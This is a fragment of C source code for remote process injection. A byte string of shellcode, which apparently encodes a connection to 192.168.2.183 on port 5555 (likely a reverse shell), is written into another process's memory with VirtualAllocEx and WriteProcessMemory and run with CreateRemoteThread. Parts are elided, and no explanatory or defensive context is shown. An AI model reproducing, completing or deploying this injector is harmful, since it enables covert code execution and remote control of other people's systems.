...
"\x89\xe5\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x02\xb7\x41\x54"
...
int main(int argc, char* argv[]) {
	...
	LPVOID rBuffer = VirtualAllocEx( hProcess, NULL, sizeof(payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rBuffer, payload, sizeof(payload), NULL);

	DWORD TID = NULL;
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
